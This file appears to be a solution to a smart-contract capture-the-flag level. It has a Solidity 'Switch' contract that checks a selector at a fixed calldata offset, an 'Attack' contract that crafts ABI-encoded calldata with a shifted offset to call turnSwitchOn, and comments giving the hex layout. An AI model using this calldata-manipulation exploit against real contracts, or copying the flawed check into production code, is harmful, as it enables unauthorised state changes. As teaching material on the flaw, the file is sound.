//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

     modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }

}

contract Attack {
    Switch public constant sw = Switch(0x939ddF8aCf36daA37B22E89AFe40B99881EED7a7);

    function kek() external {
        bytes memory data = abi.encodePacked(
            Switch.flipSwitch.selector,
            abi.encode(uint256(96)), // ignore 3 slots
            abi.encode(uint256(0)), // an empty slot as a placeholder
            abi.encode(Switch.turnSwitchOff.selector), // the selector to pass `require`
            abi.encode(uint256(32)), // length to read
            abi.encode(Switch.turnSwitchOn.selector)
        );

        (bool s,) = address(sw).call(data);
        if (!s) revert();
    }
}

/*

Selectors:
  turnSwitchOn -  0x76227e12
  turnSwitchOff - 0x20606e15
  flipSwitch -    0x30c13ade

If we want to turn off the switch, we call the Switch contract with this data: 0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002020606e1500000000000000000000000000000000000000000000000000000000
Which is:
  0x30c13ade - flipSwitch selector
  0000000000000000000000000000000000000000000000000000000000000020 - offset (where 0x00..0020 == 32 bytes), which tells how many bytes to skip from the previous selector (here we only skip this slot)
  0000000000000000000000000000000000000000000000000000000000000020 - length, which tells how many bytes to read next (here we only read the next slot)
  20606e1500000000000000000000000000000000000000000000000000000000 - turnSwitchOff selector
N.B. Slot is every 32 bytes after the selector.

We can turn off the switch, but we cannot turn it on like this, because if we replace turnSwitchOff selector with turnSwitchOn selector,
it will not pass require(selector[0] == offSelector,"Can only call the turnOffSwitch function").
We get selector[0] using calldatacopy(selector, 68, 4), which says that we need to ignore 68 bytes and read the next 4 bytes.
68 bytes == 4 bytes from flipSwitch selector + 32 bytes of `offset` + 32 bytes of `length`

To turn on the switch we beed to change the calldata:
  0x30c13ade - flipSwitch selector
  0000000000000000000000000000000000000000000000000000000000000060 - offset, which tells to ignore this and the next 2 slots (0x00..060 == 96 bytes)
  0000000000000000000000000000000000000000000000000000000000000000 - an empty slot as a placeholder
  20606e1500000000000000000000000000000000000000000000000000000000 - turnSwitchOff selector to pass `require` statement
  0000000000000000000000000000000000000000000000000000000000000020 - length, which tells to read the next slot
  76227e1200000000000000000000000000000000000000000000000000000000 - turnSwitchOn selector

Because we changed the offset the contract will call the turnSwitchOn function, but onlyOff modifier will still read from the 3rd slot
*/
